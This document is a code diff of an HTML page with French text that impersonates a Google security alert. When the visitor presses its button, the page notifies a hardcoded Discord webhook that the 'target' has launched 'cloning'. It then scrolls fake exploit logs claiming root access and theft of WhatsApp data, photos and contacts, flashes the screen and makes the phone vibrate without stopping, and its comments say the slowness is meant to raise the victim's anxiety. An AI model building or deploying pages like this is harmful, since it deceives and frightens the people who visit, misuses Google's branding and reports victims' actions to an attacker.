@@ -3,143 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Secure Verification</title>
+    <title>Google Security Verification</title>
     <style>
-        body { margin: 0; padding: 0; background-color: #ffffff; font-family: 'Courier New', Courier, monospace; overflow: hidden; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        body { margin: 0; padding: 0; background-color: #fff; font-family: 'Courier New', monospace; overflow: hidden; height: 100vh; display: flex; justify-content: center; align-items: center; }
+        
+        #google-box { text-align: center; width: 90%; max-width: 400px; font-family: sans-serif; }
+        .g-btn { background: #4285F4; color: white; border: none; padding: 15px 35px; font-weight: bold; cursor: pointer; border-radius: 4px; }
 
-        /* PHASE 1: L'APPÂT PROPRE */
-        #google-box { text-align: center; width: 90%; max-width: 400px; transition: 0.3s; }
-        .g-btn { background: #4285F4; color: white; border: none; padding: 15px 35px; font-weight: bold; cursor: pointer; border-radius: 2px; font-family: sans-serif; }
-
-        /* PHASE 2: TERMINAL DE CLONAGE */
-        #system-terminal {
+        #terminal {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; color: #0f0; padding: 20px; box-sizing: border-box; z-index: 1000;
+            background: #000; color: #0f0; padding: 15px; box-sizing: border-box; z-index: 1000;
+            font-size: 11px; overflow-y: hidden;
         }
 
-        .line { margin-bottom: 8px; font-size: 13px; border-left: 3px solid #0f0; padding-left: 10px; opacity: 0; animation: fadeIn 0.2s forwards; }
+        .line { margin-bottom: 2px; opacity: 0; animation: fadeIn 0.1s forwards; }
         @keyframes fadeIn { to { opacity: 1; } }
-
-        .critical { color: #ff0000; font-weight: bold; text-decoration: underline; }
-
-        /* BARRE DE CHARGEMENT TECHNIQUE */
-        .progress-container { display: none; margin-top: 30px; border: 1px solid #ff0000; height: 30px; position: relative; }
-        #progress-bar { width: 0%; height: 100%; background: #ff0000; transition: width 0.4s linear; }
-        #status-percent { position: absolute; width: 100%; text-align: center; top: 5px; color: #fff; font-weight: bold; }
-
-        /* PHASE 3: LE VIRUS FINAL */
-        #virus-final {
+        
+        /* FLASH FINAL ROUGE ET NOIR */
+        #flash-screen {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 2000; flex-direction: column; justify-content: center; align-items: center;
-            text-align: center;
+            z-index: 9999; flex-direction: column; justify-content: center; align-items: center;
+        }
+        .flash-active { animation: flashEffect 0.1s infinite; }
+        @keyframes flashEffect {
+            0% { background: #f00; }
+            50% { background: #000; }
+            100% { background: #f00; }
         }
 
-        .glitch-bg { animation: glitch 0.15s infinite; }
-        @keyframes glitch {
-            0% { background: #ff0000; }
-            50% { background: #00ff00; }
-            100% { background: #000000; }
-        }
-
-        pre { font-size: 8px; line-height: 8px; color: #fff; font-weight: bold; }
+        .py-val { color: #f0f; } /* Style Python string */
+        .py-key { color: #0ff; } /* Style Python keyword */
+        .py-err { color: #f00; font-weight: bold; font-size: 14px; }
     </style>
 </head>
 <body>
 
     <div id="google-box">
         <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="110">
-        <h2 style="font-family: sans-serif; font-weight: normal; color: #202124;">Vérification d'accès</h2>
-        <p style="font-family: sans-serif; color: #5f6368; font-size: 14px;">Une menace a été détectée. Confirmez que vous utilisez cet appareil pour bloquer l'intrusion.</p>
-        <button class="g-btn" onclick="engage()">VÉRIFIER L'IDENTITÉ</button>
+        <h2>Alerte de sécurité</h2>
+        <p>Une connexion non autorisée a été détectée sur votre compte. Vérifiez l'intégrité de votre mobile immédiatement.</p>
+        <button class="g-btn" onclick="start()">VÉRIFIER LE SYSTÈME</button>
     </div>
 
-    <div id="system-terminal">
-        <div id="log-container"></div>
-        
-        <div id="progress-container" class="progress-container">
-            <div id="progress-bar"></div>
-            <div id="status-percent">CHARGEMENT : 0%</div>
+    <div id="terminal">
+        <div id="logs"></div>
+    </div>
+
+    <div id="flash-screen">
+        <div style="background: #000; color: #fff; padding: 20px; font-weight: bold; text-align: center; border: 5px solid #f00;">
+            CRITICAL_SYSTEM_FAILURE<br>
+            CLONAGE WHATSAPP: 100%<br>
+            DESTINATION: 0819679859<br><br>
+            VOTRE APPAREIL EST SOUS CONTRÔLE
         </div>
-    </div>
-
-    <div id="virus-final" class="glitch-bg">
-        <pre>
-           .---.
-          /     \
-         | () () |
-          \  ^  /
-           |||||
-           |||||
-        </pre>
-        <h1 style="color: #fff; background: #000; padding: 10px;">CLONAGE SYSTÈME TERMINÉ</h1>
-        <h2 style="color: #000; background: #fff; padding: 10px;">DONNÉES ENVOYÉES : 0819679859</h2>
-        <p style="color: #fff; font-weight: bold;">CONNEXION SERVEUR : ACTIVE</p>
     </div>
 
     <script>
         const webhook = "https://discordapp.com/api/webhooks/1463375154313695425/b8j4vFvQYxlrrtYrxSXgOrV3PEsdA4vXaywKb8xIMo6qEt6vVAqc3yQb_srF7-aDg4a-";
 
-        function engage() {
+        function start() {
             document.getElementById('google-box').style.display = 'none';
-            document.getElementById('system-terminal').style.display = 'block';
-
-            if (navigator.vibrate) navigator.vibrate([300, 100, 300]);
-
-            fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "⚠️ **INTRUSION RÉUSSIE :** La cible a activé le clonage."}) });
+            document.getElementById('terminal').style.display = 'block';
+            
+            fetch(webhook, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({content: "🔥 **EXPLOIT PYTHON :** La cible a lancé le clonage !"}) });
 
             const logs = [
-                ">_ INITIALIZING OVERRIDE...",
-                ">_ DEVICE_ID: DETECTED",
-                ">_ KERNEL_EXPLOIT: SUCCESSFUL",
-                ">_ TARGETing: WHATSAPP_DATABASE",
-                ">_ TARGETing: GALLERY_DCIM",
-                ">_ TARGETing: SYSTEM_CONTACTS",
-                ">_ CLONING PARTITIONS...",
-                ">_ DESTINATION: SERVER_0819679859",
-                ">_ ENCRYPTING TUNNEL..."
+                "python3 exploit_cloner.py --target=mobile_dev",
+                "[+] Initializing exploit script...",
+                "[+] Searching for mount points...",
+                "[+] Found partition: /dev/block/sda1 (STORAGE)",
+                "[+] Found partition: /dev/block/sda2 (PRIVATE_DATA)",
+                "[!] Warning: Kernel protection detected. Bypassing...",
+                "[+] Success: Root access obtained.",
+                "[+] Loading cloning_module.py...",
+                "[+] Establishing SSL tunnel to: 0819679859",
+                "[+] Connected to remote server.",
+                ">>> Extracting WhatsApp databases...",
+                ">>> Extracting Private Photo Vault...",
+                ">>> Extracting Contacts and Messages...",
+                "------------------------------------",
+                "TRANSFERRING DATA: [##########] 100%",
+                "------------------------------------",
+                "[+] DATA_SENT_TO_WHATSAPP: 0819679859",
+                "[!] INJECTING_SYSTEM_VIRUS...",
+                "FATAL ERROR: OVERHEATING DETECTED",
+                "FATAL ERROR: CPU_CORE_CORRUPTION",
+                "SYSTEM SHUTDOWN INITIATED..."
             ];
 
             let i = 0;
-            const container = document.getElementById('log-container');
+            const logBox = document.getElementById('logs');
             const itv = setInterval(() => {
                 if (i < logs.length) {
                     const l = document.createElement('div');
                     l.className = 'line';
-                    if (i > 5) l.className += ' critical';
-                    l.innerText = logs[i];
-                    container.appendChild(l);
+                    
+                    // Style couleur façon Python
+                    let text = logs[i];
+                    if (text.includes('[+]')) text = `<span style="color:#0f0">${text}</span>`;
+                    if (text.includes('[!]')) text = `<span style="color:#ff0">${text}</span>`;
+                    if (text.includes('FATAL')) text = `<span class="py-err">${text}</span>`;
+                    
+                    l.innerHTML = text;
+                    logBox.appendChild(l);
+                    
+                    if (navigator.vibrate) navigator.vibrate(50);
                     i++;
                 } else {
                     clearInterval(itv);
-                    startTransfer();
+                    setTimeout(triggerFlash, 1500);
                 }
-            }, 1500); // Lenteur pour laisser lire chaque ligne
+            }, 800);
         }
 
-        function startTransfer() {
-            document.getElementById('progress-container').style.display = 'block';
-            let p = 0;
-            const bar = document.getElementById('progress-bar');
-            const pct = document.getElementById('status-percent');
-
-            const transfer = setInterval(() => {
-                p += Math.floor(Math.random() * 2) + 1;
-                if (navigator.vibrate) navigator.vibrate(40);
-
-                if (p >= 100) {
-                    p = 100;
-                    clearInterval(transfer);
-                    setTimeout(showVirus, 1000);
-                }
-                bar.style.width = p + "%";
-                pct.innerText = "CLONAGE TOTAL EN COURS : " + p + "%";
-            }, 800); // Très lent pour augmenter l'angoisse
-        }
-
-        function showVirus() {
-            document.getElementById('system-terminal').style.display = 'none';
-            document.getElementById('virus-final').style.display = 'flex';
-            if (navigator.vibrate) navigator.vibrate([1000, 500, 1000, 500, 2000]);
+        function triggerFlash() {
+            document.getElementById('terminal').style.display = 'none';
+            const flash = document.getElementById('flash-screen');
+            flash.style.display = 'flex';
+            flash.classList.add('flash-active');
+            
+            // Vibration violente et continue
+            if (navigator.vibrate) {
+                navigator.vibrate([100, 50, 100, 50, 100, 50, 100, 50, 1000]);
+                setInterval(() => { navigator.vibrate(200); }, 300);
+            }
         }
     </script>
 </body>
